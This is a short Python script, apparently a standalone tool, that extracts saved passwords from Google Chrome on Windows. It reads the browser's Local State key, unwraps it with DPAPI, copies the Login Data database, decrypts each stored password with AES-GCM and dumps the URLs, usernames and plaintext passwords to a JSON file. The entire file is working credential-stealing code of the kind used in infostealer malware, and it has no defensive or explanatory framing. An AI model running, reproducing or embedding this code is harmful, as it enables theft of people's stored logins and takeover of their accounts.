import os
import json
import base64
import shutil
import sqlite3
from win32.win32crypt import CryptUnprotectData # pip install pywin32
from Crypto.Cipher import AES # pip install pycryptodome


## Chrome Password Extractor
def chrome_password_extractor():
    def decrypt_password(password: bytes, key: bytes):
        iv = password[3:15]
        ciphertext = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        plaintext = cipher.decrypt(ciphertext)[:-16]
        return plaintext.decode()

    data = []

    try:
        with open(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State"), "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
        encryption_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        shutil.copyfile(os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data"), "ChromeData.db")

        with sqlite3.connect("ChromeData.db") as db:
            cursor = db.cursor()
            cursor.execute("SELECT signon_realm, origin_url, action_url, username_value, password_value, date_created, date_last_used, date_password_modified FROM logins ORDER BY date_created")
            for row in cursor.fetchall():
                username, password = row[3], decrypt_password(row[4], encryption_key)
                if username and password:
                    data.append({
                        "domain_url": row[0],
                        "origin_url": row[1],
                        "action_url": row[2],
                        "username": username,
                        "password": password,
                        "date_created": row[5],
                        "date_last_used": row[6],
                        "date_last_modified": row[7],
                    })
            cursor.close()

        db.close()

    except FileNotFoundError:
        print('Chrome data file not fount, Chrome may not be installed.')

    except sqlite3.Error:
        print('Error while reading Chrome data file.')

    finally:
        try:
            os.remove("ChromeData.db")
        except (FileNotFoundError, PermissionError):
            pass

    return data

if __name__ == '__main__':

    data = chrome_password_extractor()

    with open('data.json', 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)